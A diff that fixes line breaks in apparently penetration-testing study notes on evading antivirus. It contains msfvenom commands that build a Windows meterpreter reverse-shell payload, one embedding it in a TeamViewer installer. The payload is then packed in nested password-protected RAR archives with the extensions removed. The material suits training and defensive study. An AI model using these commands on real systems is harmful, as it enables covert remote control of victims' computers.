@@ -75,7 +75,9 @@ We are in luck because `msfvenom` offers the option of using executable templa
 Take a look at the snippet below to understand how msfvenom can embed payloads into any executable file:
 
 ```
-th1nyunb0y@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5Attempting to read payload from STDIN...
+th1nyunb0y@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
+
+Attempting to read payload from STDIN...
 Found 1 compatible encoders
 Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
 x86/shikata_ga_nai succeeded with size 27 (iteration=0)
@@ -103,7 +105,9 @@ Archiving a piece of information such as a file, folder, script, executable, pic
 ### **Generating Payload**
 
 ```
-th1nyunb0y@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5Attempting to read payload from STDIN...
+th1nyunb0y@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
+
+Attempting to read payload from STDIN...
 Found 1 compatible encoders
 Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
 x86/shikata_ga_nai succeeded with size 27 (iteration=0)
@@ -187,7 +191,9 @@ Now, try archiving it two times, passwording both archives upon creation, and re
 ### **Archiving the Payload**
 
 ```
-th1nyunb0y@htb[/htb]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gzth1nyunb0y@htb[/htb]$ tar -xzvf rarlinux-x64-612.tar.gz && cd rarth1nyunb0y@htb[/htb]$ rar a ~/test.rar -p ~/test.jsEnter password (will not be echoed): ******
+th1nyunb0y@htb[/htb]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gzth1nyunb0y@htb[/htb]$ tar -xzvf rarlinux-x64-612.tar.gz && cd rar
+
+th1nyunb0y@htb[/htb]$ rar a ~/test.rar -p ~/test.jsEnter password (will not be echoed): ******
 Reenter password: ******
 
 RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
@@ -207,13 +213,17 @@ test.js   test.rar
 ### **Removing the .RAR Extension**
 
 ```
-th1nyunb0y@htb[/htb]$ mv test.rar testth1nyunb0y@htb[/htb]$ lstest   test.js
+th1nyunb0y@htb[/htb]$ mv test.rar test
+
+th1nyunb0y@htb[/htb]$ lstest   test.js
 ```
 
 ### **Archiving the Payload Again**
 
 ```
-th1nyunb0y@htb[/htb]$ rar a test2.rar -p testEnter password (will not be echoed): ******
+th1nyunb0y@htb[/htb]$ rar a test2.rar -p test
+
+Enter password (will not be echoed): ******
 Reenter password: ******
 
 RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
@@ -228,7 +238,9 @@ Done
 ### **Removing the .RAR Extension**
 
 ```
-th1nyunb0y@htb[/htb]$ mv test2.rar test2th1nyunb0y@htb[/htb]$ ls
+th1nyunb0y@htb[/htb]$ mv test2.rar test2
+
+th1nyunb0y@htb[/htb]$ ls
 test   test2   test.js
 ```
 
